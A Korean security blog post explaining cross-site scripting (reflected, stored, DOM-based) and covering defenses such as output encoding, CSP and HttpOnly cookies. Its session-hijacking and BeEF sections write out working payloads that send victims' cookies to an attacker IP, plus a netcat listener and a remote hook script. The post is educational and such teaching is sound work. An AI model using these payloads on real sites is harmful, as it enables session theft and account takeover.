---
layout: post
title: "XSS"
date: 2025-09-28 17:00:00 +0900
categories: [web-hacking]
---

## 1. 개요

**XSS (Cross-Site Scripting)**는 웹 애플리케이션이 사용자로부터 입력받은 값을 적절한 검증 없이 웹 페이지에 그대로 출력할 때 발생하는 취약점이다.
공격자는 악성 스크립트(`<script>...`)를 삽입하여 피해자가 해당 페이지를 열람할 때 브라우저에서 스크립트가 실행되게 만든다. 이를 통해 **세션 쿠키 탈취**, **피싱 사이트 유도**, **악성코드 다운로드** 등의 공격이 가능하다.

### 주요 특징
*   공격 대상이 서버가 아닌 **클라이언트(사용자)**이다.
*   자바스크립트를 통해 브라우저가 가진 모든 권한(쿠키 접근, API 호출 등)을 제어할 수 있다.

---

## 2. 공격 유형

### Reflected XSS (반사형)
사용자의 입력값이 서버를 거쳐 **즉시 응답 페이지에 반사**되는 형태이다. 검색창이나 URL 파라미터에서 주로 발생한다.
공격자는 악성 스크립트가 포함된 링크(URL)를 이메일이나 메신저로 피해자에게 전송하여 클릭을 유도한다.

**예시 요청:**
```http
GET /search?q=<script>alert('XSS')</script> HTTP/1.1
```
**서버 응답:**
```html
<p>검색 결과: <script>alert('XSS')</script></p>
```

### Stored XSS (저장형)
악성 스크립트가 서버의 데이터베이스나 파일 시스템에 **영구적으로 저장**되는 형태이다. 게시판, 댓글, 방명록 등에서 발생한다.
피해자가 해당 게시글을 읽을 때마다 스크립트가 실행되므로, Reflected XSS보다 파급력이 훨씬 크다.

**공격 시나리오:**
1.  공격자가 게시판에 `<script>악성코드</script>` 내용을 포함한 글을 작성한다.
2.  일반 사용자가 해당 글을 클릭하여 읽는 순간, 브라우저에서 악성코드가 실행된다.

### DOM-based XSS (DOM 기반)
서버를 경유하지 않고 **브라우저 내 자바스크립트가 직접 DOM을 조작**하는 과정에서 발생하는 XSS이다. 서버 응답 본문에는 악성 스크립트가 존재하지 않아 WAF나 서버 측 필터링을 우회할 수 있다.

**취약한 코드 예시:**
```html
<script>
  // URL 해시(#) 값을 그대로 innerHTML에 삽입
  document.getElementById('output').innerHTML = location.hash.substring(1);
</script>
```

**공격 URL:**
```
http://example.com/page#<img src=x onerror=alert('XSS')>
```

*   Reflected/Stored XSS와 달리 HTTP 트래픽에 페이로드가 남지 않아 탐지가 어렵다.
*   대응책: `innerHTML` 대신 `textContent` 사용, DOM 조작 시 입력값 검증 및 인코딩.

---

## 3. 심화 공격: Session Hijacking

단순한 경고창(`alert`)을 띄우는 것을 넘어, 사용자의 세션 ID(쿠키)를 탈취하여 계정을 도용하는 공격이다.

### 1. 공격자 리스너 준비
공격자 서버(192.9.200.12)에서 쿠키를 수신할 포트를 연다.
```bash
sudo nc -lvnp 80
```

### 2. 쿠키 탈취 스크립트 주입
게시판에 다음 스크립트를 삽입한다. 피해자의 쿠키를 Base64로 인코딩하여 공격자 서버로 전송한다.
```html
<script>
  document.location = 'http://192.9.200.12/?cookie=' + btoa(document.cookie);
</script>
```

### 3. 쿠키 획득 및 도용
피해자가 글을 읽으면 공격자의 리스너에 로그가 남는다.
```bash
GET /?cookie=c2VjdXJpdHk9bG93OyBQSFBTRVNTSUQ9YWJjMTIz HTTP/1.1
```
공격자는 이를 디코딩하여 `PHPSESSID`를 얻고, 자신의 브라우저 쿠키에 덮어써서 피해자 계정으로 로그인한다.

---

## 4. 심화 공격: BeEF (브라우저 좀비화)

**BeEF (The Browser Exploitation Framework)**는 XSS 취약점을 이용해 연결된 브라우저들을 좀비처럼 제어하는 강력한 도구이다.

### 1. Hook 스크립트 주입
취약한 페이지에 BeEF의 훅(Hook) 자바스크립트를 삽입한다.
```html
<script src="http://192.9.200.12:3000/hook.js"></script>
```

### 2. 브라우저 제어 (BeEF 패널)
피해자가 페이지에 접속하면 BeEF 관리자 패널(`Online Browsers`)에 피해자의 브라우저가 나타난다. 공격자는 다음과 같은 명령을 내릴 수 있다.
*   **Get Cookies**: 쿠키 정보 탈취
*   **Redirect Browser**: 피싱 사이트로 강제 이동
*   **Social Engineering**: 가짜 로그인 팝업 등을 띄워 정보 탈취

---

## 5. 보안 대책

가장 근본적인 대책은 **입력값 검증**과 **출력값 인코딩**이다.

### 출력값 인코딩 (HTML Entity Encoding)
브라우저가 `<script>`를 코드가 아닌 단순 문자로 인식하도록 특수문자를 변환한다.
*   `<` → `&lt;`
*   `>` → `&gt;`
*   `"` → `&quot;`
*   `'` → `&#x27;`

**PHP 예시:**
```php
// htmlspecialchars 함수 사용
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```

### 기타 보안 헤더 적용
*   **Content Security Policy (CSP)**: 실행 가능한 스크립트의 출처를 제한하여 XSS를 완하고한다.
*   **HttpOnly Flag**: 쿠키 설정 시 `HttpOnly` 속성을 추가하면 자바스크립트(`document.cookie`)로 쿠키에 접근할 수 없어 세션 탈취를 막을 수 있다.

<hr class="short-rule">
